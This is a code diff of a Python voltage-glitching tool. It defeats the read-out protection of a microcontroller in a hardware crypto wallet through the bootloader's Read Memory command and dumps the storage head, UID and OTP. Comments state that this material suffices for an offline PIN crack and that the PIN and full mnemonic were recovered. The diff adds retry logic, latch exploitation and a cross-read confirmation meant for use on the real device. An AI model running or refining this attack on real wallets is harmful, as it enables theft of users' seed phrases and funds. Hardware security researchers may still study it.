@@ -38,6 +38,13 @@ KEY PARAMETERS - SMA / crowbar mode (G_CROWBAR=1 default since 2026-10-27):
   G_RND_LO=20 G_RND_HI=45  width in [LO,HI] nm (Kesenheimer-style 2D
                          search: ext grid x random strength). G_RND_REP=0
                          -> fixed G_REPEATS ladder instead.
+  G_ADDR_RETRIES=5     on a command-ACK whose address phase is refused:
+                          raw addr+count retries (NO glitch - just re-sends
+                          the address bytes; state persists?). There is NO
+                          second glitch: on RDP-1 a clean stage-1 glitch lets
+                          the whole read proceed (jerinsunny single-pulse
+                          capture), so ACK_NO_DATA is an imperfect stage-1,
+                          fixed by stage-1 timing/strength - not a 2nd shot.
   G_REPEATS=5            strength knob (fixed mode): 5 cycles = 30.0 ns
                          Ladder (full-gap passes): 39nm = 1.7% dead,
                          flips ~1/14,000 (hammer39: 0/600 at hot points;
@@ -86,6 +93,7 @@ import csv
 import os
 import random
 import signal
+import subprocess
 import sys
 import threading
 import time
@@ -114,27 +122,31 @@ UART = find_ftdi()
 # every extra 256 B chunk costs ~1 more successful flip (~1/1400 shots
 # each at 2026-10-28 rates) - budget the campaign accordingly.
 STORAGE_BASE, STORAGE_LEN = 0x08008000, 0x4000    # PRACTICE-chip values
-TARGETS = ([('storage_0000', STORAGE_BASE, 256)]
-           + [('uid', 0x1FFF7A10, 12), ('otp3', 0x1FFF7860, 32)]
-           + [(f'storage_{i:04d}', STORAGE_BASE + 256 * i, 256)
-              for i in range(1, STORAGE_LEN // 256)])
+# storage chunks FIRST (all oracle-gated -> bankable by a single flip), then
+# uid/otp3 LAST (outside the oracle -> need cross-read/latch). This keeps non-
+# latching flips productive on storage instead of stalling on uid.
+_STORAGE = [('storage_0000', STORAGE_BASE, 256)] + \
+           [(f'storage_{i:04d}', STORAGE_BASE + 256 * i, 256)
+            for i in range(1, STORAGE_LEN // 256)]
+_EXTRA = [('uid', 0x1FFF7A10, 12), ('otp3', 0x1FFF7860, 32)]
+TARGETS = _STORAGE + _EXTRA
 
-if os.environ.get('G_TARGETED'):
-    # NORCOW (storage v2, fw 1.7+ incl 1.13.1): all secrets live in the
-    # dict HEAD at 0x08008000, entries sequential: PIN_LOGS(0x0001),
-    # EDEK_PVC(0x0002, salt + encrypted DEK/SAK + poly1305 tag = complete
-    # offline-PIN-crack material), VERSION, then app entries incl the
-    # encrypted mnemonic. Practice image confirms: all data in first 3
-    # chunks (61/64 all-FF). MKesenheimer's +0x190/+0x290 offsets are
-    # storage-v1 (fw 1.6.x) ONLY - do NOT use for v2. 5 chunks = 1.25 KB
-    # covers the dict head with 2x margin; norcow parse offline flags
-    # any entry straddling the end -> extend then.
+# DEFAULT = TARGETED: grab only the pieces decryption needs. NORCOW (storage
+# v2, fw 1.7+ incl 1.13.1) packs ALL secrets into the dict HEAD at 0x08008000,
+# entries sequential: PIN_LOGS(0x0001), EDEK_PVC(0x0002, salt + encrypted
+# DEK/SAK + poly1305 tag = complete offline-PIN-crack material), VERSION, then
+# app entries incl the encrypted mnemonic (0x0102). Verified end-to-end
+# 2026-10-30: PIN + full mnemonic recovered from just the first 3 chunks + uid.
+# Chunks 3-63 are blank (FF) free space - no secret material, not worth glitching.
+# 5 chunks = 1.25 KB covers the dict head with margin; the offline norcow parse
+# flags any entry straddling the end -> bump G_TARGETED_N then. uid/otp3 are the
+# PIN-KDF hardware salt (MKesenheimer's +0x190/+0x290 offsets are storage-v1,
+# fw 1.6.x ONLY - do NOT use for v2).
+if os.environ.get('G_FULL') == '1':
+    pass                      # full 16 KB storage dump (mostly blank) + uid/otp3
+else:
     _n = int(os.environ.get('G_TARGETED_N', 5))
-    # list is [storage_0000, uid, otp3, storage_0001..]: take storage head
-    # (0000..N-1 = TARGETS[0] + TARGETS[3:3+N-1]) plus uid/otp3 (cheap wins,
-    # useful for phase-2 RDP2 regression checks later)
-    _head = [TARGETS[0]] + TARGETS[3:3 + _n - 1]
-    TARGETS = _head + TARGETS[1:3]
+    TARGETS = _STORAGE[:_n] + _EXTRA   # head chunks (the secrets) + uid/otp3
 CUR = [TARGETS[0]]          # [(name, addr, nbytes)] - what the NEXT flip reads
 DONE = {}                   # name -> bytes collected this run (see G_RESUME)
 DUMP_DIR = None             # dumps/run_YYYYmmdd_HHMMSS/, set in main()
@@ -172,6 +184,12 @@ REPEATS = [int(x) for x in os.environ.get('G_REPEATS', '5').split(',')]
 RND_REP = os.environ.get('G_RND_REP', '1') == '1'
 RND_LO_NS = float(os.environ.get('G_RND_LO', 20))   # nm low end
 RND_HI_NS = float(os.environ.get('G_RND_HI', 45))   # nm high end
+# ACK-SPENDING (2026-10-29): a command-stage ACK is precious (~1/215
+# shots in-cluster) - never waste it on one refused address phase.
+ADDR_RETRIES = int(os.environ.get('G_ADDR_RETRIES', 5))  # raw addr retries
+# (stage-2 glitch removed 2026-10-29: RDP-1 needs only a clean stage-1 - a
+# single pulse clears RDP for the whole Read Memory. ACK_NO_DATA = dirty
+# stage-1, fixed by stage-1 tuning, not a second glitch.)
 # RDP decision window (user notes + LA 2026-10-27): sweet spot = the gap
 # right AFTER the 0xEE stop bit ends (~+173us TIO3) and BEFORE the NACK
 # starts (~+187us TIO3) -> default 173-187us = the full decision gap.
@@ -179,7 +197,7 @@ RND_HI_NS = float(os.environ.get('G_RND_HI', 45))   # nm high end
 # clkgen can be retuned for strength without hand-rescaling (old trap: cycle
 # literals silently sliding the window ~18us on a clkgen change).
 # G_EXT_MIN/G_EXT_MAX (raw cycles) override when explicitly set.
-US_MIN = float(os.environ.get('G_US_MIN', 175))  # window start, us past TIO3 (hot zone head)
+US_MIN = float(os.environ.get('G_US_MIN', 173))  # window start, us past TIO3 (hot zone head)
 US_MAX = float(os.environ.get('G_US_MAX', 192))  # window end, us past TIO3 (NACK tail)
 EXT_MIN = int(float(os.environ.get('G_EXT_MIN', US_MIN * CLKGEN / 1e6)))
 EXT_MAX = int(float(os.environ.get('G_EXT_MAX', US_MAX * CLKGEN / 1e6)))
@@ -193,6 +211,12 @@ else:
 # the range sweep - used to re-strike known-winning offsets.
 EXTS = [int(x) for x in os.environ.get('G_EXTS', '').split(',') if x.strip()]
 SAMPLES = int(os.environ.get('G_SAMPLES', 3))  # shots per grid point
+# CONFIRMATION LAYER (2026-10-29): cross-read is the oracle-free judge that
+# goes to the real device - read the same chunk N times from the latched
+# session, trust only bytes that reproduce across >= MIN of them.
+CROSSREAD_N = int(os.environ.get('G_CROSSREAD_N', 3))     # reads per chunk
+CROSSREAD_MIN = int(os.environ.get('G_CROSSREAD_MIN', 2))  # agreeing to CONFIRM
+ALERT = os.environ.get('G_ALERT', '1') == '1'  # audible + spoken SUCCESS alert
 SHOTS_MAX = int(os.environ.get('G_SHOTS', 15000))  # fits band farm 479pts x 30 (14370)
 COOLDOWN = float(os.environ.get('G_COOLDOWN', 0.15))
 RESET_EVERY = int(os.environ.get('G_RESET_EVERY', 1))  # 1 = reset+resync
@@ -281,6 +305,7 @@ def complete_read():
 
 
 def save_chunk(name, data, meta):
+    ensure_dump_dir()
     open(os.path.join(DUMP_DIR, name + '.bin'), 'wb').write(data)
     with open(os.path.join(DUMP_DIR, 'manifest.txt'), 'a') as mf:
         mf.write(meta + '\n')
@@ -293,45 +318,343 @@ def next_target():
     return None
 
 
+# uid/otp3 live outside flash: a dirty single flip gets a command-ACK but the
+# address stage refuses them (verified 2026-10-30). They are LATCH-ONLY targets
+# - only a genuine session latch (bypass holding across unglitched reads) can
+# read them, if they are readable via Read Memory at all. So we never FARM them
+# with single glitches (that was the 15k-shot drought); we farm flash and grab
+# uid/otp3 the instant any latch fires.
+EXTRA_NAMES = tuple(t[0] for t in _EXTRA)
+
+
+def next_storage_target():
+    """Next undone NON-extra (flash) range - what the single-shot loop farms."""
+    for t in TARGETS:
+        if t[0] not in EXTRA_NAMES and t[0] not in DONE:
+            return t
+    return None
+
+
+def next_farm_target():
+    """What CUR should point at for glitch farming. Prefer an undone flash
+    range; once all flash is banked but uid/otp3 still need a latch, fish on ANY
+    flash range (re-read the first one - harmless re-confirm) purely to keep
+    provoking flips/latches until one latches and delivers uid/otp3."""
+    t = next_storage_target()
+    if t is not None:
+        return t
+    return next((x for x in TARGETS if x[0] not in EXTRA_NAMES), TARGETS[0])
+
+
+# ---------------------------------------------------------------------------
+# CONFIRMATION LAYER - two independent judges for a recovered chunk, so a
+# glitch SUCCESS can be trusted without peeking at the answer:
+#   A = oracle    byte-compare vs storage.bin. Ground truth, PRACTICE ONLY
+#                 (ORACLE is None on the real device). Gates banking here.
+#   B = cross-read  read the SAME chunk several times from the latched
+#                 session; trust only bytes that reproduce. No external truth,
+#                 so this is the judge that goes to the real device.
+# On practice both run: the oracle gates, cross-read is scored against it
+# (A/B confusion matrix -> ab_matrix.txt). On the real device ORACLE is None
+# and cross-read becomes the gate. all-FF is NOT special here - a legitimately
+# erased chunk reproduces all-FF and is CONFIRMED correctly (2026-10-29).
+# ---------------------------------------------------------------------------
+AB = {}                 # (oracle_verdict, crossread_verdict) -> count
+_ab_writer = [None]     # csv.writer for per-event ab_log.csv
+_ab_file = [None]
+_dump_made = [False]    # dumps/run_.../ is created lazily on the first find
+
+
+def ensure_dump_dir():
+    """Create dumps/run_.../ and open ab_log.csv - but only on the first
+    thing worth saving (a flip candidate). An empty run leaves no folder
+    behind (2026-10-29 user request)."""
+    if _dump_made[0]:
+        return
+    os.makedirs(DUMP_DIR, exist_ok=True)
+    f = open(os.path.join(DUMP_DIR, 'ab_log.csv'), 'w', newline='')
+    w = csv.writer(f)
+    w.writerow(['time', 'chunk', 'addr', 'nbytes', 'oracle', 'crossread',
+                'n_reads', 'first16'])
+    _ab_file[0], _ab_writer[0] = f, w
+    _dump_made[0] = True
+    print(f'[+] first find - created dump dir {DUMP_DIR}', flush=True)
+
+
+def alert_success(text):
+    """Fire-and-forget desktop alert on a flip: terminal bell + chime +
+    spoken line. Never blocks the campaign and never raises."""
+    if not ALERT:
+        return
+    try:
+        sys.stdout.write('\a')
+        sys.stdout.flush()
+    except Exception:
+        pass
+    env = dict(os.environ)
+    env.setdefault('DISPLAY', ':1')
+    for cmd in (['canberra-gtk-play', '-i', 'complete'],
+                ['spd-say', '-r', '-10', text]):
+        try:
+            subprocess.Popen(cmd, env=env, stdout=subprocess.DEVNULL,
+                             stderr=subprocess.DEVNULL)
+        except Exception:
+            pass
+
+
+def oracle_check(target, data):
+    """A-judge: MATCH / MISMATCH vs storage.bin, or NA (no oracle / out of
+    range / wrong length)."""
+    _name, addr, nbytes = target
+    if ORACLE is None or data is None or len(data) != nbytes:
+        return 'NA'
+    lo = addr - STORAGE_BASE
+    if lo < 0 or lo + nbytes > len(ORACLE):
+        return 'NA'
+    return 'MATCH' if ORACLE[lo:lo + nbytes] == data else 'MISMATCH'
+
+
+def read_target_n(target, n):
+    """Latched unglitched reads of `target`, up to n. Each needs a fresh
+    0x11 0xEE ACK (proof the bypass still holds) + a full-length payload;
+    stops the instant the latch drops. Returns the list of payloads read."""
+    reads = []
+    save = CUR[0]
+    CUR[0] = target
+    try:
+        for _ in range(n):
+            ser.reset_input_buffer()
+            ser.write(b'\x11\xee')
+            r = ser.read(8)
+            if not r or 0x79 not in r:
+                break
+            data, _note = complete_read()
+            if data is None or len(data) != target[2]:
+                break
+            reads.append(data)
+    finally:
+        CUR[0] = save
+    return reads
+
+
+def crossread_verdict(reads, nbytes):
+    """B-judge over a list of reads (glitch candidate first, if any):
+      CONFIRMED  >= CROSSREAD_MIN reads, all identical & right length
+      GHOST      enough reads but they disagree (transient corruption)
+      UNCONFIRMED  too few reads (latch dropped before we could verify)
+    Returns (verdict, confirmed_bytes_or_None, n_good)."""
+    good = [r for r in reads if r is not None and len(r) == nbytes]
+    if len(good) < CROSSREAD_MIN:
+        return 'UNCONFIRMED', None, len(good)
+    if all(r == good[0] for r in good):
+        return 'CONFIRMED', good[0], len(good)
+    return 'GHOST', None, len(good)
+
+
+def confirm_chunk(target, candidate):
+    """Run both judges on a recovered chunk. `candidate` = the glitched read
+    (counts as cross-read #1); None when draining an already-latched session.
+    Logs one A/B row. Returns (banked_bytes_or_None, oracle_verdict,
+    crossread_verdict, n_good). Gate: oracle in practice, cross-read on the
+    real device."""
+    ensure_dump_dir()
+    name, addr, nbytes = target
+    want = CROSSREAD_N - (1 if candidate is not None else 0)
+    extra = read_target_n(target, max(0, want))
+    reads = ([candidate] if candidate is not None else []) + extra
+    crv, cr_bytes, n_good = crossread_verdict(reads, nbytes)
+    rep = candidate if candidate is not None else (reads[0] if reads else None)
+    orv = oracle_check(target, rep)
+    AB[(orv, crv)] = AB.get((orv, crv), 0) + 1
+    if _ab_writer[0]:
+        _ab_writer[0].writerow(
+            [f'{datetime.now():%H:%M:%S}', name, f'0x{addr:08X}', nbytes,
+             orv, crv, n_good, (rep[:16].hex() if rep else '')])
+        _ab_file[0].flush()
+    if ORACLE is not None and orv in ('MATCH', 'MISMATCH'):
+        # oracle can judge this chunk (in storage.bin range) -> it gates
+        banked = rep if orv == 'MATCH' else None
+    else:
+        # oracle can't judge (uid/otp3 are outside storage.bin -> orv='NA'),
+        # or no oracle at all (real device) -> cross-read is the gate
+        banked = cr_bytes if crv == 'CONFIRMED' else None
+    return banked, orv, crv, n_good
+
+
+def write_ab_matrix():
+    """Confusion matrix: cross-read (B) scored against the oracle (A). The
+    number that gates real-device trust is FALSE ACCEPTS = 0."""
+    rows = ['MATCH', 'MISMATCH', 'NA']
+    cols = ['CONFIRMED', 'UNCONFIRMED', 'GHOST']
+    L = ['A/B confusion matrix  (A=oracle truth  x  B=cross-read judge)',
+         'rows = oracle verdict, cols = cross-read verdict', '',
+         f'{"":>9}' + ''.join(f'{c:>13}' for c in cols)]
+    for r in rows:
+        L.append(f'{r:>9}' + ''.join(f'{AB.get((r, c), 0):>13}' for c in cols))
+    fa = AB.get(('MISMATCH', 'CONFIRMED'), 0)
+    fr = AB.get(('MATCH', 'GHOST'), 0)
+    und = AB.get(('MATCH', 'UNCONFIRMED'), 0)
+    tp = AB.get(('MATCH', 'CONFIRMED'), 0)
+    tn = AB.get(('MISMATCH', 'GHOST'), 0)
+    L += ['',
+          f'FALSE ACCEPTS (oracle MISMATCH, cross-read CONFIRMED): {fa}'
+          + ('   <-- MUST be 0 before trusting cross-read on the real device'
+             if fa else '   (0 - good)'),
+          f'false rejects (oracle MATCH, cross-read GHOST):        {fr}',
+          f'unconfirmed   (oracle MATCH, too few latched reads):   {und}',
+          f'true accepts {tp}   true rejects {tn}']
+    denom = tp + fr + und
+    if denom:
+        L.append(f'cross-read on real data: {100 * tp / denom:.1f}% confirmed, '
+                 f'{100 * fr / denom:.1f}% false-rejected, '
+                 f'{100 * und / denom:.1f}% unconfirmed (n={denom})')
+    txt = '\n'.join(L)
+    if DUMP_DIR:
+        try:
+            open(os.path.join(DUMP_DIR, 'ab_matrix.txt'), 'w').write(txt + '\n')
+        except Exception:
+            pass
+    print('\n' + txt, flush=True)
+
+
+def latch_probe(target):
+    """One UNGLITCHED Read Memory of `target` while (maybe) latched. Returns
+    (data_or_None, cmd_acked). cmd_acked=True means the 0x11 0xEE command still
+    ACKs (0x79) - the session latch is ALIVE - regardless of whether the address
+    stage served data. This separates 'latch alive but this address refused'
+    (the decisive OTP negative) from 'latch truly dropped' (command NACK)."""
+    ser.reset_input_buffer()
+    ser.write(b'\x11\xee')
+    r = ser.read(8)
+    if not r or 0x79 not in r:
+        return None, False                   # command NACK / silence -> gone
+    save = CUR[0]
+    CUR[0] = target
+    try:
+        data, _note = complete_read()
+    finally:
+        CUR[0] = save
+    if data is not None and len(data) == target[2]:
+        return data, True
+    return None, True                        # latch alive, address refused
+
+
+def grab_extras_latched():
+    """FIRST thing on any live latch: go for the latch-only targets (uid, otp3)
+    before draining anything else - the latch is the only context they can be
+    read, and it may be short-lived. Each is probed up to CROSSREAD_N times with
+    latch-liveness so an address-refusal is logged as the decisive negative, not
+    mistaken for a dropped latch. Returns True if the latch is still alive."""
+    alive = True
+    for name, addr, nbytes in _EXTRA:
+        if name in DONE:
+            continue
+        t = (name, addr, nbytes)
+        reads = []
+        acked_any = False
+        for _ in range(CROSSREAD_N):
+            data, acked = latch_probe(t)
+            if not acked:
+                alive = False
+                break
+            acked_any = True
+            if data is not None:
+                reads.append(data)
+        crv, cr_bytes, n_good = crossread_verdict(reads, nbytes)
+        orv = oracle_check(t, reads[0] if reads else None)
+        AB[(orv, crv)] = AB.get((orv, crv), 0) + 1
+        if crv == 'CONFIRMED':
+            DONE[name] = cr_bytes
+            save_chunk(name, cr_bytes, f'{datetime.now():%H:%M:%S} LATCHED '
+                       f'{name} (grabbed first under latch) [{orv}/{crv}]')
+            print(f'  [LATCHED+] *** {name} secured under latch '
+                  f'({len(DONE)}/{len(TARGETS)}) [{orv}/{crv}] ***', flush=True)
+            alert_success(f'{name} secured under latch')
+        elif n_good > 0:
+            print(f'  [extra] {name}: latched reads disagreed ({crv}) - '
+                  f'not banked', flush=True)
+        elif acked_any:
+            # latch provably ALIVE (0x11 kept ACKing) yet the address stage
+            # refused every read: the decisive negative - this region is not
+            # served by Read Memory even under a genuine bypass.
+            print(f'  [extra] {name}: command LATCHED but address 0x{addr:08X} '
+                  f'REFUSED all reads - region not served by Read Memory under '
+                  f'bypass', flush=True)
+        if not alive:
+            break
+    return alive
+
+
 def chain_unglitched():
-    """Right after a flipped read: probe whether the bypass latched for the
-    session (an UNGLITCHED 0x11 pair ACKs). If it did, drain every
-    remaining chunk in one go. Returns True only on FULL collection."""
-    drained = 0
+    """Right after a flipped read the bypass often latches (unglitched 0x11 0xEE
+    keeps ACKing). Policy: on ANY latch, grab the latch-only targets (uid/otp3)
+    FIRST, then drain remaining flash while the latch holds. Returns True ONLY
+    when the FULL target set (incl uid/otp3) is collected - so the campaign is
+    not 'done' until a latch has delivered uid/otp3."""
+    # 1) FIRST: spend the fresh latch on uid/otp3.
+    alive = grab_extras_latched()
+    if not alive:
+        return next_target() is None         # latch gone; done only if all in
+    # 2) THEN: drain remaining flash ranges while the latch still holds.
     while True:
-        t = next_target()
+        t = next_storage_target()
         if t is None:
-            return True
-        ser.reset_input_buffer()
-        ser.write(b'\x11\xee')
-        r = ser.read(8)
-        if not r or 0x79 not in r:
-            return drained > 0
-        CUR[0] = t
-        data, note = complete_read()
-        if data is None:
-            return drained > 0
-        DONE[t[0]] = data
-        save_chunk(t[0], data, f'{datetime.now():%H:%M:%S} LATCHED {t[0]}')
-        drained += 1
-        print(f'  [LATCHED+] {t[0]} drained '
-              f'({len(DONE)}/{len(TARGETS)} chunks)', flush=True)
+            break                            # all flash drained
+        banked, orv, crv, n_good = confirm_chunk(t, None)
+        if banked is not None:
+            DONE[t[0]] = banked
+            save_chunk(t[0], banked, f'{datetime.now():%H:%M:%S} LATCHED '
+                       f'{t[0]} [{orv}/{crv}]')
+            print(f'  [LATCHED+] {t[0]} drained '
+                  f'({len(DONE)}/{len(TARGETS)} chunks) [{orv}/{crv}]',
+                  flush=True)
+            continue
+        if n_good == 0:
+            print(f'  [latch] dropped at {t[0]} - back to glitching',
+                  flush=True)
+        else:
+            open(os.path.join(DUMP_DIR, t[0] + '.bad.bin'), 'wb').write(
+                b'')  # marker; reads disagreed / oracle mismatch
+            print(f'  [latch] {t[0]} rejected ({orv}/{crv}) - not banked',
+                  flush=True)
+        break
+    return next_target() is None             # fully done only if uid/otp3 too
 
 
 def assemble_and_report():
     """Write assembled outputs + coverage report into DUMP_DIR."""
+    if not _dump_made[0]:
+        # nothing was ever found - no folder, nothing to assemble
+        print(f'[=] collected 0/{len(TARGETS)} chunks - no dump dir '
+              '(nothing found)', flush=True)
+        return
     if next_target() is None:
-        storage = b''.join(DONE[f'storage_{i:04d}']
-                           for i in range(STORAGE_LEN // 256))
-        open(os.path.join(DUMP_DIR, 'storage_dump.bin'), 'wb').write(storage)
+        _nc = STORAGE_LEN // 256
+        if all(f'storage_{i:04d}' in DONE for i in range(_nc)):
+            storage = b''.join(DONE[f'storage_{i:04d}'] for i in range(_nc))
+            open(os.path.join(DUMP_DIR, 'storage_dump.bin'), 'wb').write(storage)
+        else:
+            # targeted/partial run: write the contiguous storage HEAD we have
+            # (don't fabricate a full 16 KB from chunks we never dumped)
+            _h = []
+            _i = 0
+            while f'storage_{_i:04d}' in DONE:
+                _h.append(DONE[f'storage_{_i:04d}'])
+                _i += 1
+            open(os.path.join(DUMP_DIR, 'storage_head.bin'), 'wb').write(
+                b''.join(_h))
+            print(f'[=] targeted collection: storage_head.bin = {_i} chunks '
+                  '(+ uid/otp3)', flush=True)
         if 'uid' in DONE:
             open(os.path.join(DUMP_DIR, 'uid.hex'), 'w').write(
                 DONE['uid'].hex() + '\n')
         if 'otp3' in DONE:
             open(os.path.join(DUMP_DIR, 'otp3.hex'), 'w').write(
                 DONE['otp3'].hex() + '\n')
-        print('[***] FULL COLLECTION COMPLETE - storage_dump.bin, uid.hex,'
-              ' otp3.hex written', flush=True)
+        print('[***] COLLECTION COMPLETE - storage image + uid.hex/otp3.hex '
+              f'written ({len(DONE)}/{len(TARGETS)} targets)', flush=True)
+        alert_success('collection complete')
+    write_ab_matrix()
     print(f'[=] collected {len(DONE)}/{len(TARGETS)} chunks -> {DUMP_DIR}',
           flush=True)
 
@@ -425,7 +748,27 @@ def attempt(ext_offset, width, repeat):
         except Exception:
             pass
     if r and 0x79 in r:
+        # pre-buffer disambiguates REAL accept (79 79) from a glitch-
+        # corrupted NACK#2 (1f 79) - see FINDINGS 2026-10-29 byte-by-byte
+        pre = f'pre={r.hex()}'
         data, note = complete_read()
+        if not data:
+            # command-ACK but address phase refused: raw (NO-glitch) retries
+            # only - the ROM may still be waiting on the address phase / the
+            # corrupted state may persist briefly. There is deliberately NO
+            # second glitch: a clean stage-1 clears RDP for the whole read
+            # (see FINDINGS 2026-10-29, jerinsunny single-pulse capture).
+            extra = []
+            for _i in range(ADDR_RETRIES):
+                data, note2 = complete_read()
+                if data:
+                    note = f'retry{_i + 1}: {note2}'
+                    break
+                extra.append(note2)
+            if not data:
+                note = f'{pre} ' + ' | '.join(extra + [note])
+            else:
+                note = f'{pre} {note}'
         if data:
             if validate_payload(data, CUR[0][2]):
                 return 'SUCCESS', data, note or ''
@@ -561,11 +904,12 @@ def main():
     logw = csv.writer(logf)
     logw.writerow(['config', CLKGEN, OFFSET, ','.join(map(str, WIDTHS)),
                    ','.join(map(str, REPEATS)), EXT_MIN, EXT_MAX, tag])
-    logw.writerow(['shot', 'ext_offset', 'us', 'width', 'repeat', 'verdict', 'note'])
+    logw.writerow(['shot', 'ext_offset', 'us', 'width', 'repeat', 'rep_ns',
+                   'verdict', 'note'])
 
     global DUMP_DIR, ORACLE
+    # path only - the folder is created lazily on the first find (ensure_dump_dir)
     DUMP_DIR = os.path.join('dumps', f'run_{datetime.now():%Y%m%d_%H%M%S}')
-    os.makedirs(DUMP_DIR, exist_ok=True)
     if os.path.isfile('storage.bin'):
         ORACLE = open('storage.bin', 'rb').read()
         print(f'[+] practice oracle: storage.bin ({len(ORACLE)} B, '
@@ -576,11 +920,11 @@ def main():
             p = os.path.join(resume, t[0] + '.bin')
             if os.path.isfile(p):
                 DONE[t[0]] = open(p, 'rb').read()
-        t = next_target()
+        t = next_farm_target()   # farm flash; uid/otp3 are latch-only
         if t:
             CUR[0] = t
-        print(f'[+] resumed {len(DONE)} chunks from {resume}, next: '
-              f'{CUR[0][0]}', flush=True)
+        print(f'[+] resumed {len(DONE)} chunks from {resume}, farming: '
+              f'{CUR[0][0]} (uid/otp3 grabbed on any latch)', flush=True)
     print(f'[+] collector: {len(TARGETS)} chunks (16 KB storage + uid + '
           f'otp3), first target {CUR[0][0]} @ 0x{CUR[0][1]:08X}, '
           f'outdir dumps/run_*', flush=True)
@@ -604,8 +948,10 @@ def main():
             for e in (EXTS if EXTS else range(EXT_MIN, EXT_MAX + 1, STEP)):
                 yield e
 
-    _rep_lo = max(1, round(RND_LO_NS * CLKGEN / 1e9))
-    _rep_hi = max(_rep_lo, round(RND_HI_NS * CLKGEN / 1e9))
+    _rep_lo = max(1, -int(-RND_LO_NS * CLKGEN // 1e9))   # ceil: never below LO
+    _rep_hi = max(_rep_lo, int(RND_HI_NS * CLKGEN / 1e9))  # floor: never above HI
+    # 2026-10-29 user: 48nm kills too often - HI capped at 45 -> with the
+    # 6ns quantum @166.67MHz the effective ceiling is rep7 = 42nm.
 
     for ext in _passes():
         for width in WIDTHS:
@@ -639,14 +985,16 @@ def main():
                         need_baseline = True   # rebuilt session -> re-verify
                         continue          # same grid point, next stochastic roll
                     shot += 1
-                    logw.writerow([shot, ext, round(ext * 1e6 / CLKGEN, 2),
-                                   width, repeat, verdict, note])
+                    logw.writerow([shot, ext, round(ext * 1e6 / CLKGEN, 1),
+                                   width, repeat,
+                                   round(repeat / CLKGEN * 1e9, 1),
+                                   verdict, note])
                     # live per-shot verdict (every glitch, not just heartbeats)
                     _ns = (f'={repeat / CLKGEN * 1e9:.1f}ns'
                            if OUTPUT == 'enable_only' else '')
                     _pct = 100.0 * shot / total_shots if total_shots else 0.0
                     print(f'  [{datetime.now():%H:%M:%S}] #{shot} '
-                          f'({_pct:.0f}%) '
+                          f'({_pct:.2f}%) '
                           f'ext={ext} ({ext * 1e6 / CLKGEN:.1f}us) '
                           f'w{width} r{repeat}{_ns} -> {verdict}'
                           + (f' ({note})' if note else ''), flush=True)
@@ -656,59 +1004,66 @@ def main():
                     # COLLECTOR: each flip banks the chunk it read, probes
                     # for a session-latch, then farms the next chunk.
                     if verdict == 'SUCCESS':
-                        name, addr, _n = CUR[0]
-                        oracle = ''
-                        if ORACLE and addr >= STORAGE_BASE \
-                                and addr - STORAGE_BASE < len(ORACLE) \
-                                and len(payload) == _n:
-                            seg = ORACLE[addr - STORAGE_BASE:
-                                         addr - STORAGE_BASE + _n]
-                            oracle = ('MATCH' if seg == payload else
-                                      f'MISMATCH exp={seg[:8].hex()}..')
-                        if oracle.startswith('MISMATCH'):
-                            # GHOST READ: handshake OK but flash returned
-                            # erase-pattern for a region that holds data
-                            # (2026-10-28: storage_0000 banked all-FF,
-                            # oracle caught it). NOT banked - retry chunk.
-                            # Real chips have no oracle: use cross-read
-                            # consistency there.
+                        target = CUR[0]
+                        name, addr, _n = target
+                        # two-judge confirmation: oracle gates in practice,
+                        # cross-read gates on the real device. confirm_chunk
+                        # creates the dump dir lazily + logs the A/B row.
+                        banked, orv, crv, n_good = confirm_chunk(target, payload)
+                        if banked is None:
+                            # a judge refused: practice oracle MISMATCH (ghost
+                            # erase-pattern where data is expected) or cross-
+                            # read disagreement. Keep forensics, do NOT bank,
+                            # re-farm the same chunk.
                             open(os.path.join(DUMP_DIR, name + '.bad.bin'),
                                  'wb').write(payload)
-                            print(f'  [!] GHOST READ {name}: oracle '
-                                  f'{oracle} - saved .bad.bin, NOT banked,'
-                                  f' retrying chunk', flush=True)
+                            print(f'  [!] REJECTED {name}: oracle={orv} '
+                                  f'crossread={crv} (n_read={n_good}) - saved '
+                                  f'.bad.bin, NOT banked, retrying chunk',
+                                  flush=True)
                             logf.flush()
                             _flat[0] = 0
                         else:
-                            DONE[name] = payload
-                            save_chunk(name, payload,
-                                       f'{datetime.now():%H:%M:%S} shot#{shot} '
-                                       f'ext={ext} ({ext * 1e6 / CLKGEN:.1f}us) '
-                                       f'{name} first16={payload[:16].hex()} '
-                                       f'{oracle}')
-                            if oracle:
-                                print(f'      practice-oracle: {oracle}',
+                            was_done = name in DONE   # re-flip while fishing
+                            DONE[name] = banked
+                            _repns = repeat / CLKGEN * 1e9
+                            if not was_done:
+                                save_chunk(name, banked,
+                                           f'{datetime.now():%H:%M:%S} shot#{shot} '
+                                           f'ext={ext} ({ext*1e6/CLKGEN:.1f}us) '
+                                           f'w{width} rep{repeat} ({_repns:.1f}ns) '
+                                           f'{name} first16={banked[:16].hex()} '
+                                           f'[{orv}/{crv}]')
+                                print(f'\n[***] CHUNK SECURED  {name} '
+                                      f'({len(banked)} B @ 0x{addr:08X}) '
+                                      f'ext={ext} ({ext * 1e6 / CLKGEN:.1f}us) '
+                                      f'w{width} rep{repeat}={_repns:.1f}ns '
+                                      f'[oracle={orv} crossread={crv}]\n'
+                                      f'      first16: {banked[:16].hex()}',
                                       flush=True)
-                        print(f'\n[***] CHUNK SECURED  {name} '
-                              f'({len(payload)} B @ 0x{addr:08X}) '
-                              f'ext={ext} ({ext * 1e6 / CLKGEN:.1f}us)\n'
-                              f'      first16: {payload[:16].hex()}', flush=True)
-                        if name == 'storage_0000' and \
-                                payload[:4] == CANARY_MAGIC:
-                            print('      canary match - practice storage '
-                                  '(informational only)', flush=True)
-                        if chain_unglitched():
-                            assemble_and_report()
+                                alert_success(f'chunk secured, {len(DONE)} of '
+                                              f'{len(TARGETS)}')
+                                if name == 'storage_0000' and \
+                                        banked[:4] == CANARY_MAGIC:
+                                    print('      canary match - practice '
+                                          'storage (informational only)',
+                                          flush=True)
+                            # on ANY flip, probe for a latch: if it latches,
+                            # chain_unglitched grabs uid/otp3 FIRST, then drains
+                            # the rest. Only "done" when uid/otp3 are in too.
+                            if chain_unglitched():
+                                assemble_and_report()
+                                logf.flush()
+                                teardown()
+                                return
+                            t = next_farm_target()   # keep farming flash
+                            if t:
+                                CUR[0] = t
+                            if not was_done:
+                                print(f'      collector -> next chunk '
+                                      f'{CUR[0][0]} ({len(DONE)}/{len(TARGETS)} '
+                                      f'banked, farming continues)', flush=True)
                             logf.flush()
-                            teardown()
-                            return
-                        t = next_target()
-                        if t:
-                            CUR[0] = t
-                        print(f'      collector -> next chunk {CUR[0][0]} '
-                              f'({len(DONE)}/{len(TARGETS)} banked, '
-                              f'farming continues)', flush=True)
-                        logf.flush()
